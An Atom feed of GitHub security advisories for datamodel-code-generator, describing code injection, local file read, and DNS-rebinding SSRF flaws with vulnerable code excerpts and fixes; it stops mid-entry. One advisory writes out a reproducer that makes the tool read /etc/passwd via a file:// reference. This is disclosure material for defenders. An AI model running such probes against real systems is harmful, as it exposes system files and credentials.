<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-07-28T23:49:30.960Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[datamodel-code-generator] `datamodel-code-generator` vulnerable to code injection via unescaped carriage return in `--extra-template-data` `comment` field]]></title>
        <id>https://github.com/advisories/GHSA-wjv6-jcfj-mf9r</id>
        <link href="https://github.com/advisories/GHSA-wjv6-jcfj-mf9r"/>
        <updated>2026-07-28T21:50:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>datamodel-code-generator</code> is vulnerable to code injection when a developer passes an <code>--extra-template-data</code> file whose <code>comment</code> value contains a literal <code>\r</code> (carriage return). The <code>comment</code> variable is rendered into a Python <code>#</code> comment in six built-in templates with <strong>no</strong> line-terminator escaping. Python's tokenizer treats a bare CR as a physical-line terminator (see <a href="https://docs.python.org/3/reference/lexical_analysis.html#physical-lines">Python language reference — Physical lines</a>), so the comment ends at the <code>\r</code> and the text after it is parsed as Python, including, when the CR is followed by suitable indentation, as a statement within the class body that follows on the next template line.</p>
<h3 id="details">Details</h3>
<p>The vulnerable templates each contain <code># {{ comment }}</code> with no escaping:</p>
<ul>
<li><code>src/datamodel_code_generator/model/template/TypeAliasAnnotation.jinja2:12</code> and <code>:19</code></li>
<li><code>src/datamodel_code_generator/model/template/TypeAliasType.jinja2:12</code> and <code>:19</code></li>
<li><code>src/datamodel_code_generator/model/template/TypeStatement.jinja2:12</code> and <code>:19</code></li>
<li><code>src/datamodel_code_generator/model/template/pydantic_v2/BaseModel.jinja2:4</code></li>
<li><code>src/datamodel_code_generator/model/template/pydantic_v2/RootModel.jinja2:19</code></li>
<li><code>src/datamodel_code_generator/model/template/pydantic_v2/RootModelTypeAlias.jinja2:13</code></li>
</ul>
<p>The <code>pydantic_v2/BaseModel.jinja2:4</code> site is representative:</p>
<pre><code class="language-jinja2">class {{ class_name }}({{ base_class }}):{% if comment is defined %}  # {{ comment }}{% endif %}
</code></pre>
<p>When the developer-supplied extras file populates <code>comment</code> for a model, the value reaches the template via <code>DataModel.extra_template_data</code> (set in <code>src/datamodel_code_generator/model/base.py:736-742</code>) and Jinja2 interpolates it raw. None of the templates use <code>comment_safe</code>, <code>escape_docstring</code>, or any other line-terminator filter.</p>
<h3 id="poc">PoC</h3>
<p>Complete self contained POC is available at my secret gist: <a href="https://gist.github.com/thegr1ffyn/8ad6b8cb3cc2be9d3a0144aeb6896a3f">https://gist.github.com/thegr1ffyn/8ad6b8cb3cc2be9d3a0144aeb6896a3f</a></p>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Who's affected</strong>: any developer or CI pipeline that runs <code>datamodel-codegen --extra-template-data &lt;file&gt;</code> where the extras file is influenced by attacker-controlled input. Realistic scenarios include:<ul>
<li>Extras file generated from a third-party schema-annotation system.</li>
<li>Extras file vendored from an upstream repository.</li>
<li>Extras file produced by a script that merges multiple <code>comment</code> sources.</li>
<li>Build pipelines that template the extras file from environment variables, ticket descriptions, or commit metadata.</li>
</ul>
</li>
<li><strong>What it gains</strong>: arbitrary Python code execution in the importer's process at <code>import</code> time.</li>
<li><strong>What it does NOT need</strong>: the schema itself can be entirely benign; only the extras file needs to contain the malicious <code>comment</code>.</li>
<li><strong>What does block it</strong>: not passing <code>--extra-template-data</code>, or rejecting extras files whose <code>comment</code> values contain <code>\r</code>, <code>\x0b</code>, or <code>\x0c</code> before invocation.</li>
</ul>
<h3 id="resolution">Resolution</h3>
<p>The fix normalizes <code>comment</code> values from built-in <code>--extra-template-data</code> before template rendering. Inline comments now convert CRLF, bare CR, vertical tab, and form feed into LF and prefix continuation lines with <code># </code>, so attacker-controlled text stays inside the generated Python comment block.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to <code>datamodel-code-generator</code> <code>0.60.2</code> or later.</p>
<p>This issue affects <code>datamodel-code-generator</code> versions <code>&gt;= 0.14.1, &lt;= 0.60.1</code> and is fixed in <code>0.60.2</code>.</p>
<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-wjv6-jcfj-mf9r">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-wjv6-jcfj-mf9r</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/b73abb5cd703a50471b8950bbd3bd0b82ad71de7">https://github.com/koxudaxi/datamodel-code-generator/commit/b73abb5cd703a50471b8950bbd3bd0b82ad71de7</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2</a></li>
<li><a href="https://github.com/advisories/GHSA-wjv6-jcfj-mf9r">https://github.com/advisories/GHSA-wjv6-jcfj-mf9r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wjv6-jcfj-mf9r</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-28T21:50:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[datamodel-code-generator] datamodel-code-generator vulnerable to arbitrary local file read via JSON-Schema `$ref` (`file://` and `../` traversal), bypassing `--no-allow-remote-refs`]]></title>
        <id>https://github.com/advisories/GHSA-8359-h9fx-j6v9</id>
        <link href="https://github.com/advisories/GHSA-8359-h9fx-j6v9"/>
        <updated>2026-07-28T21:49:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>datamodel-code-generator</code> resolves JSON-Schema <code>$ref</code> targets that point at the local filesystem without restricting them to the input/base directory and without honoring the remote-reference security control. In the default configuration, an attacker who controls an input schema (a "paste your OpenAPI/JSON-Schema" service, a CI job that generates models from a submitted spec, or any multi-tenant codegen platform) can read any file the process user can read and map the host filesystem. This works via either a <code>file://</code> absolute URI or a <code>../</code>-escaped relative reference, and it succeeds even when <code>--no-allow-remote-refs</code> is set.</p>
<p>This is an unauthenticated path-traversal / information-disclosure issue (CWE-22 / CWE-200) plus a bypass of a documented security control.</p>
<h3 id="details">Details</h3>
<p><code>is_url()</code> classifies <code>file://</code> as a URL (<code>reference.py:1249</code>):</p>
<pre><code class="language-python">def is_url(ref: str) -&gt; bool:
    return ref.startswith(("https://", "http://", "file://"))
</code></pre>
<p>The remote-ref gate then explicitly exempts <code>file://</code>, so <code>--no-allow-remote-refs</code> never applies to it (<code>parser/jsonschema.py</code>, <code>_get_ref_body</code>):</p>
<pre><code class="language-python">if is_url(resolved_ref):
    if not resolved_ref.startswith("file://") and self.http_local_ref_path is None:
        if self.allow_remote_refs is False:
            raise Error(...)        # &lt;-- skipped for file://
        ...
    return self._get_ref_body_from_url(resolved_ref)
return self._get_ref_body_from_remote(resolved_ref)
</code></pre>
<p>Both local-file branches read the target with <strong>no containment check</strong>. The <code>file://</code> branch reads any absolute path:</p>
<pre><code class="language-python"># _get_ref_body_from_url
if ref.startswith("file://"):
    path = url2pathname(urlparse(ref).path)     # absolute path, anywhere on disk
    return self.remote_object_cache.get_or_put(
        ref, default_factory=lambda _: load_data_from_path(Path(path), self.encoding))
</code></pre>
<p>and the plain relative branch lets <code>../</code> escape the base directory:</p>
<pre><code class="language-python"># _get_ref_body_from_remote
full_path = self.base_path / resolved_ref       # no is_relative_to(base_path) check
return self.remote_object_cache.get_or_put(
    str(full_path), default_factory=lambda _: load_data_from_path(full_path, self.encoding))
</code></pre>
<p>For contrast, the HTTP-local-ref branch (<code>_get_ref_body_from_local_http_path</code>) <em>does</em> enforce <code>is_relative_to(base_path)</code>; these two filesystem branches do not. (This is distinct from the previously reported HTTP <code>$ref</code>/<code>--url</code> SSRF hardened in <code>http.py</code>  these code paths never enter <code>http.py</code>.)</p>
<p>The fetched file is read and parsed, yielding two impacts:</p>
<ol>
<li><p><strong>Arbitrary file read + filesystem oracle (any file).</strong> The process opens any readable path, and the three distinguishable outcomes leak filesystem structure: <code>Expected dict, got str/list</code> = the file exists and was read into the process; <code>FileNotFoundError: '&lt;abs path&gt;'</code> = missing; <code>PermissionError: '&lt;abs path&gt;'</code> = exists but unreadable. An attacker uses this to probe arbitrary paths and recover the operator's absolute filesystem layout.</p>
</li>
<li><p><strong>Verbatim secret disclosure into the generated code.</strong> When the referenced node is JSON-Schema-shaped, values in <code>const</code>/<code>default</code>/<code>enum</code>/<code>description</code> positions are emitted verbatim into the generated Python that is returned to the attacker — i.e. exactly the internal/private schema and config files a codegen host stores (specs with example/default tokens, default credentials, internal hostnames, service-account JSON, k8s secret manifests).</p>
</li>
</ol>
<p>Scope note (to avoid overstating): the <em>raw bytes</em> of unstructured files such as <code>/etc/passwd</code> or a PEM <code>id_rsa</code> are read into the process but are not echoed verbatim into the output, because they parse to a single scalar and are rejected as "not a schema". For those files the impact is the read itself plus the existence/permission/absolute-path oracle; verbatim content disclosure applies to schema-shaped nodes.</p>
<h3 id="poc">PoC</h3>
<p>Self-contained reproducer: <a href="https://gist.github.com/thegr1ffyn/2a87e81f985883acc30d0118c52da4d3">https://gist.github.com/thegr1ffyn/2a87e81f985883acc30d0118c52da4d3</a> /  (<code>poc.py</code> creates everything in a temp dir, runs the generator, asserts read + leak + gate bypass, and cleans up). 
Minimal manual reproduction of the arbitrary read (any path works):</p>
<pre><code class="language-bash">printf '{"type":"object","properties":{"x":{"$ref":"file:///etc/passwd"}}}' &gt; probe.json
datamodel-codegen --input probe.json --input-file-type jsonschema --output o.py
# -&gt; "TypeError: Expected dict, got str"  == /etc/passwd was opened and fully parsed.
# Swap the $ref for a missing/unreadable path to see the existence/permission oracle.
</code></pre>
<h3 id="impact">Impact</h3>
<p>Arbitrary local file read / path traversal (CWE-22) → information disclosure (CWE-200), plus bypass of <code>--no-allow-remote-refs</code>. Any application, CI pipeline, or multi-tenant service that runs <code>datamodel-code-generator</code> on an untrusted schema and exposes (returns, logs, commits, renders) the generated code is affected. The attacker can: open and read any file the process user can read (demonstrated: <code>/etc/passwd</code>, a PEM <code>id_rsa</code>, paths under <code>/root/</code>); map the host filesystem and recover absolute paths; and exfiltrate secret values verbatim from any schema-shaped node. Attacker controls only the input schema; no authentication or special privileges required.</p>
<h3 id="suggested-remediation">Suggested remediation</h3>
<ol>
<li>Do not exempt <code>file://</code> from the <code>allow_remote_refs</code> gate, treat it as an external scheme.</li>
<li>In both <code>_get_ref_body_from_url</code> (the <code>file://</code> case) and <code>_get_ref_body_from_remote</code>, reject targets that are not <code>resolved.is_relative_to(self.base_path)</code>, mirroring the existing check in <code>_get_ref_body_from_local_http_path</code>.</li>
</ol>
<h3 id="maintainer-status">Maintainer status</h3>
<p>Confirmed by maintainer review and regression tests. The private fix PR was merged and released in <code>0.62.0</code>: <a href="https://github.com/koxudaxi/datamodel-code-generator-ghsa-8359-h9fx-j6v9/pull/1">https://github.com/koxudaxi/datamodel-code-generator-ghsa-8359-h9fx-j6v9/pull/1</a></p>
<p>Fix summary: apply the remote-ref gate to <code>file://</code> refs and local JSON Schema refs outside the input base path. In <code>0.62.0</code>, <code>--no-allow-remote-refs</code> blocks these references; the default compatibility mode emits a <code>FutureWarning</code> and users who intentionally rely on trusted external local refs can pass <code>--allow-remote-refs</code>.</p>
<p>Release status: fixed in <code>0.62.0</code> for the documented <code>--no-allow-remote-refs</code> bypass, with a compatibility warning for the default behavior.</p>
<p>Validation: <code>uv run --group test --extra http pytest tests/main/jsonschema/test_main_jsonschema.py</code> passed locally; <code>uv run --group fix ruff check src/datamodel_code_generator/parser/jsonschema.py tests/main/jsonschema/test_main_jsonschema.py</code> passed.</p>
<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-8359-h9fx-j6v9">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-8359-h9fx-j6v9</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/2ff4a72b4550a2b2069754c5b075b1655067e5fb">https://github.com/koxudaxi/datamodel-code-generator/commit/2ff4a72b4550a2b2069754c5b075b1655067e5fb</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.62.0">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.62.0</a></li>
<li><a href="https://github.com/advisories/GHSA-8359-h9fx-j6v9">https://github.com/advisories/GHSA-8359-h9fx-j6v9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8359-h9fx-j6v9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-28T21:49:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[datamodel-code-generator] `datamodel-code-generator` vulnerable to code injection in via attacker-controlled `default_factory` schema field]]></title>
        <id>https://github.com/advisories/GHSA-386q-5hp3-95m9</id>
        <link href="https://github.com/advisories/GHSA-386q-5hp3-95m9"/>
        <updated>2026-07-28T21:48:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>datamodel-code-generator</code> is vulnerable to code injection when generating Python models from an attacker-controlled JSON Schema, OpenAPI, YAML, JSON, Avro, Protobuf, or XSD schema. When a property carries a <code>"default_factory"</code> key, its value is interpolated verbatim — as a raw Python expression — into the generated <code>Field(default_factory=...)</code> / <code>field(default_factory=...)</code> call. Because this assignment is evaluated at class-definition time (i.e. on <code>import</code> of the generated module), an attacker who controls the schema controls a Python expression that runs in the consumer's process. No special CLI flags are required.</p>
<h3 id="details">Details</h3>
<p>The vulnerable chain spans the JSON-Schema-shaped parser and three sink locations (Pydantic v2, dataclass, msgspec):</p>
<p><strong>Source — schema → <code>extras</code></strong>:</p>
<ul>
<li><code>src/datamodel_code_generator/parser/jsonschema.py:600-614</code> — <code>DEFAULT_FIELD_KEYS</code> includes the literal string <code>"default_factory"</code>.</li>
<li><code>src/datamodel_code_generator/parser/jsonschema.py:457-459</code> — <code>JsonSchemaObject.__init__</code> stores any non-standard key (including <code>default_factory</code>) in <code>self.extras</code>.</li>
<li><code>src/datamodel_code_generator/parser/jsonschema.py:797-812</code> — <code>get_field_extras</code> preserves <code>default_factory</code> through to the field model.</li>
</ul>
<p><strong>Sinks — <code>extras</code> → generated Python expression</strong>:</p>
<ol>
<li><p><code>src/datamodel_code_generator/model/pydantic_base.py:222-249</code>:</p>
<pre><code class="language-python">default_factory = data.pop("default_factory", None)
...
if default_factory is not None:
    field_arguments = [f"default_factory={default_factory}", *field_arguments]
</code></pre>
<p>The <code>default_factory</code> value is interpolated raw (no <code>repr()</code>, no validation).</p>
</li>
<li><p><code>src/datamodel_code_generator/model/dataclass.py:211</code>:</p>
<pre><code class="language-python">f"{k}={v if k == 'default_factory' else repr(v)}"
</code></pre>
<p>Explicit special-case to skip <code>repr()</code> for <code>default_factory</code>.</p>
</li>
<li><p><code>src/datamodel_code_generator/model/msgspec.py:361</code> — same pattern as dataclass.</p>
</li>
</ol>
<p>Because <code>default_factory</code> is in <code>DEFAULT_FIELD_KEYS</code>, no special CLI flag is needed to reach the sink. Any input format that uses the JSON-Schema-shaped parser (<code>jsonschema</code>, <code>openapi</code>, <code>yaml</code>, <code>json</code>, <code>dict</code>, <code>csv</code>) — and any input format that converts to it (<code>avro</code>, <code>protobuf</code>, <code>xmlschema</code>) — is in scope.</p>
<h3 id="confirmed-poc-matrix">Confirmed PoC matrix</h3>
<table>
<thead>
<tr>
<th>Input file type</th>
<th>Output model type</th>
<th>Result</th>
</tr>
</thead>
<tbody><tr>
<td><code>jsonschema</code></td>
<td><code>pydantic_v2.BaseModel</code></td>
<td>RCE on import</td>
</tr>
<tr>
<td><code>jsonschema</code></td>
<td><code>dataclasses.dataclass</code></td>
<td>RCE on import</td>
</tr>
<tr>
<td><code>jsonschema</code></td>
<td><code>msgspec.Struct</code></td>
<td>RCE on import</td>
</tr>
<tr>
<td><code>jsonschema</code></td>
<td><code>typing.TypedDict</code></td>
<td>safe (TypedDict doesn't render <code>field()</code>; <code>default_factory</code> silently dropped)</td>
</tr>
<tr>
<td><code>openapi</code></td>
<td><code>pydantic_v2.BaseModel</code></td>
<td>RCE on import</td>
</tr>
</tbody></table>
<p>Other JSON-Schema-shaped inputs (<code>yaml</code>, <code>json</code>, <code>dict</code>, <code>csv</code>, <code>avro</code>, <code>protobuf</code>, <code>xmlschema</code>) follow the same code path and are expected to reproduce.</p>
<h3 id="poc">PoC</h3>
<p>Self contained Proof of Concept is available at my secret gist: <a href="https://gist.github.com/thegr1ffyn/9648b0fe4fcf7d569ac8e61dd11eebaf">https://gist.github.com/thegr1ffyn/9648b0fe4fcf7d569ac8e61dd11eebaf</a></p>
<h3 id="impact">Impact</h3>
<ul>
<li><strong>Who's affected</strong>: any developer or CI pipeline that runs <code>datamodel-codegen</code> against a schema they didn't author themselves — third-party API specs, schemas pulled from a registry, vendored upstream <code>.json</code> / <code>.yaml</code> / <code>.avsc</code> / <code>.proto</code> / <code>.xsd</code> files, schemas fetched from a remote URL or introspection endpoint — <em>and</em> who imports the generated <code>.py</code>.</li>
<li><strong>What it gains</strong>: arbitrary Python code execution in the importer's process at <code>import</code> time. The PoC copies <code>/etc/passwd</code> to a tmp file to demonstrate arbitrary read; the same primitive supports any operation the importing process can perform (filesystem write, environment exfiltration, secondary network calls, RCE on CI runners).</li>
<li><strong>What it does NOT need</strong>: no special CLI flags, no custom templates, no <code>--extra-template-data</code>, no <code>--use-schema-description</code>. Default invocation against a malicious schema is sufficient.</li>
<li><strong>What does block it</strong>: choosing <code>--output-model-type typing.TypedDict</code> (which doesn't render <code>field()</code> / <code>Field()</code> calls). All other supported output model types are vulnerable.</li>
</ul>
<h3 id="resolution">Resolution</h3>
<p>The fix validates schema-provided <code>default_factory</code> values while extracting JSON Schema field extras. Only the supported factory names <code>dict</code>, <code>list</code>, and <code>set</code> are accepted; any other value now raises a generator error before code generation. Generator-created default factories for supported mutable defaults and optional nested models continue to use the existing code paths.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to <code>datamodel-code-generator</code> <code>0.60.2</code> or later.</p>
<p>This issue affects <code>datamodel-code-generator</code> versions <code>&gt;= 0.17.0, &lt;= 0.60.1</code> and is fixed in <code>0.60.2</code>.</p>
<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-386q-5hp3-95m9">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-386q-5hp3-95m9</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/17fc235e234cbcfaaadef8c74cb72c9687db0d1d">https://github.com/koxudaxi/datamodel-code-generator/commit/17fc235e234cbcfaaadef8c74cb72c9687db0d1d</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2</a></li>
<li><a href="https://github.com/advisories/GHSA-386q-5hp3-95m9">https://github.com/advisories/GHSA-386q-5hp3-95m9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-386q-5hp3-95m9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-28T21:48:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[datamodel-code-generator] datamodel-code-generator vulnerable to SSRF protection bypass via DNS rebinding]]></title>
        <id>https://github.com/advisories/GHSA-vx7x-vcc2-c44g</id>
        <link href="https://github.com/advisories/GHSA-vx7x-vcc2-c44g"/>
        <updated>2026-07-28T21:45:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>datamodel-code-generator</code>'s anti-SSRF guard validates the resolved IP of a fetch target once and then lets <code>httpx</code> perform its own independent DNS resolution to connect, so the validated address is never pinned. A hostname that resolves to a public IP at validation time and a private IP at connection time (DNS rebinding) bypasses the guard and reaches loopback, link-local cloud-metadata endpoints (<code>169.254.169.254</code>), and other internal services — even with the default <code>allow_private_network=False</code>. This is a server-side request forgery reachable when the tool fetches an attacker-influenced URL (remote <code>$ref</code>, or <code>--url</code>).</p>
<h3 id="details">Details</h3>
<p>In <code>src/datamodel_code_generator/http.py</code>, <code>get_body()</code> calls <code>_validate_url_for_fetch()</code>, which resolves the host via <code>_get_ips_from_host()</code> (<code>socket.getaddrinfo</code>) and rejects non-global addresses:</p>
<pre><code class="language-python">ips = _get_ips_from_host(host)            # resolution #1 (validation)
if not ips: return
if all(_is_safe_ip(ip) for ip in ips): return
raise SchemaFetchError(...)               # blocks private/link-local/reserved
</code></pre>
<p>It then connects with a separate, independent resolution:</p>
<pre><code class="language-python">response = httpx.get(current_url, ...)    # resolution #2 (connection) -- NOT pinned to #1
</code></pre>
<p>Nothing ties the connection to the IP that passed validation. Between the two resolutions a low-TTL attacker-controlled record can flip from a public address (passes the guard) to a private one (used by the connection). The redirect-handling loop in the same function does correctly re-validate each redirect URL, so this is specifically a TOCTOU/rebinding gap in the host-to-IP check, not a redirect issue.</p>
<h3 id="poc">PoC</h3>
<p>Self-contained reproducer: <a href="https://gist.github.com/thegr1ffyn/c1d54dd6ff2a4c0d7d0dabe00c4985f4">https://gist.github.com/thegr1ffyn/c1d54dd6ff2a4c0d7d0dabe00c4985f4</a> 
It starts a loopback HTTP server standing in for an internal target and patches <code>socket.getaddrinfo</code> to return a public IP on the guard's lookup and <code>127.0.0.1</code> on httpx's  the standard deterministic way to demonstrate this TOCTOU class (the real-world trigger is a low-TTL rebinding DNS record the attacker controls). </p>
<p>Reachability in normal use: the attacker registers a rebinding hostname and gets the tool to fetch <code>http://that-host/schema.json</code> either via <code>--url</code> or via a remote <code>$ref</code> in a supplied schema (remote refs are fetched on the default configuration).</p>
<h3 id="impact">Impact</h3>
<p>Server-side request forgery (CWE-918) via a time-of-check/time-of-use resolution gap (CWE-367). Any service or CI pipeline that runs <code>datamodel-code-generator</code> against attacker-influenced URLs is affected, including deployments that rely on the default private-network protection. Consequences include reading cloud instance-metadata credentials (<code>169.254.169.254</code>), reaching internal-only HTTP services, and port/host probing of the internal network, the document fetched from the internal target is also parsed and can be reflected into the generated output.</p>
<h3 id="maintainer-status">Maintainer status</h3>
<p>Confirmed by maintainer review and regression tests. The private fix PR was merged and released in <code>0.63.0</code>: <a href="https://github.com/koxudaxi/datamodel-code-generator-ghsa-vx7x-vcc2-c44g/pull/1">https://github.com/koxudaxi/datamodel-code-generator-ghsa-vx7x-vcc2-c44g/pull/1</a></p>
<p>Fix summary: pin the validated DNS result set during the HTTP fetch so a host cannot resolve to a safe address during validation and a different address during connection.</p>
<p>Release status: fixed in <code>0.63.0</code>; <code>0.62.0</code> and earlier are affected.</p>
<p>Validation: <code>uv run --group test --extra http pytest tests/test_http.py</code> passed locally for DNS pinning and URL-fetch regression coverage; <code>uv run --group fix ruff check src/datamodel_code_generator/http.py tests/test_http.py</code> passed.</p>
<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-vx7x-vcc2-c44g">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-vx7x-vcc2-c44g</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/25c8b7e497419eb20b230fa3318c04f9bebc5a6f">https://github.com/koxudaxi/datamodel-code-generator/commit/25c8b7e497419eb20b230fa3318c04f9bebc5a6f</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.63.0">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.63.0</a></li>
<li><a href="https://github.com/advisories/GHSA-vx7x-vcc2-c44g">https://github.com/advisories/GHSA-vx7x-vcc2-c44g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vx7x-vcc2-c44g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-28T21:45:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[datamodel-code-generator] `datamodel-code-generator` vulnerable to code execution on import via unescaped `validators` entries in --extra-template-data]]></title>
        <id>https://github.com/advisories/GHSA-8m8r-38jm-f355</id>
        <link href="https://github.com/advisories/GHSA-8m8r-38jm-f355"/>
        <updated>2026-07-28T21:44:10.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When the Pydantic v2 output mode is in use, <code>datamodel-code-generator</code> reads a <code>validators</code> array from each model entry in the <code>--extra-template-data</code> file and synthesises a Pydantic <code>@field_validator(...)</code> decorator from each entry. The field names and the validator mode are interpolated into the decorator call wrapped in <em>unescaped</em> single quotes. A value containing <code>'</code> breaks out of the string literal, letting an attacker emit an arbitrary positional Python expression into the decorator. The expression is evaluated at class-definition time, i.e. the moment the developer imports the generated module. This is the same trust model as the recently-published GHSA-wjv6-jcfj-mf9r (extras-file comment injection) but the impact is full RCE rather than a docstring leak.</p>
<h3 id="details">Details</h3>
<p>Sink: <code>src/datamodel_code_generator/model/pydantic_v2/base_model.py</code>, <code>_process_validators</code> (lines 405–449, at tag <code>0.60.1</code> / commit <code>a321547e</code>):</p>
<pre><code class="language-python">def _process_validators(self) -&gt; None:
    validators = self.extra_template_data.get("validators")
    if not validators:
        return
    ...
    for validator in validators:
        fields = validator.get("fields") or [validator.get("field")]
        fields = [f for f in fields if f]
        if not fields:
            continue
        function_path: str = validator["function"]
        function_name = function_path.rsplit(".", 1)[-1]
        mode = validator.get("mode", "after")
        fields_str = ", ".join(f"'{f}'" for f in fields)     # (A) UNESCAPED
        ...
        mode_str = f"mode='{mode}'"                          # (B) UNESCAPED
        prepared_validators.append({
            "fields_str": fields_str,
            "mode_str":   mode_str,
            "method_name": method_name,
            "function_name": function_name,
            "mode": mode,
        })
        self._additional_imports.append(Import.from_full_path(function_path))  # (C)
</code></pre>
<p>The strings from (A) and (B) flow verbatim into <code>src/datamodel_code_generator/model/template/pydantic_v2/BaseModel.jinja2</code>:</p>
<pre><code class="language-jinja">@field_validator({{ v.fields_str }}, {{ v.mode_str }})
</code></pre>
<p>There is no <code>repr()</code> call, no identifier check, and no quote-escaping.</p>
<p>Secondary sink at (C): <code>Import.from_full_path(function_path)</code> splits on the last <code>.</code> and emits <code>from &lt;prefix&gt; import &lt;suffix&gt;</code>. A <code>;</code> in <code>function_path</code> therefore lands in the generated import line and runs as a statement at module load.</p>
<h3 id="poc">PoC</h3>
<p>A self-contained one-file PoC is available here: <a href="https://gist.github.com/thegr1ffyn/34d5c647e74487ffb2be27c76dace2aa">https://gist.github.com/thegr1ffyn/34d5c647e74487ffb2be27c76dace2aa</a></p>
<h3 id="impact">Impact</h3>
<p>Arbitrary code execution in the developer's interpreter / CI runner the moment the generated module is imported. Anyone who accepts a <code>--extra-template-data</code> file from an untrusted source is impacted:</p>
<ul>
<li>Pull requests adding or modifying project-local <code>*.template-data.json</code> / <code>.codegen.json</code> files consumed by a <code>make codegen</code> rule or pre-commit hook.</li>
<li>Configuration snippets pasted from issue templates, READMEs, or third-party guides.</li>
<li>Multi-tenant CI systems where one tenant's config file is read by another tenant's build.</li>
</ul>
<p>Same blast radius as GHSA-wjv6-jcfj-mf9r, but silent RCE rather than a docstring leak — significantly higher impact under the same threat model.</p>
<blockquote>
<p>Introduced in 0.52.1 by commit <a href="https://github.com/koxudaxi/datamodel-code-generator/commit/a2b27562"><code>a2b27562</code></a> (<em>Add --validators option for Pydantic v2 field validators</em>).</p>
</blockquote>
<h3 id="resolution">Resolution</h3>
<p>The fix validates <code>validators</code> entries with Pydantic models before rendering them. Field names must be valid non-keyword Python identifiers, <code>function</code> must be a dotted Python identifier path, and <code>mode</code> must be one of Pydantic's supported validator modes. The generated decorator arguments now render field names with <code>repr()</code> and mode with <code>!r</code>, so validated values are still emitted as Python string literals.</p>
<h3 id="remediation">Remediation</h3>
<p>Upgrade to <code>datamodel-code-generator</code> <code>0.60.2</code> or later.</p>
<p>This issue affects <code>datamodel-code-generator</code> versions <code>&gt;= 0.52.1, &lt;= 0.60.1</code> and is fixed in <code>0.60.2</code>.</p>
<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-8m8r-38jm-f355">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-8m8r-38jm-f355</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/a43d02906111a2fdcaf13ee5b62eb2da85376f19">https://github.com/koxudaxi/datamodel-code-generator/commit/a43d02906111a2fdcaf13ee5b62eb2da85376f19</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.60.2</a></li>
<li><a href="https://github.com/advisories/GHSA-8m8r-38jm-f355">https://github.com/advisories/GHSA-8m8r-38jm-f355</a></li>
</ul>
]]></content>
        <author>
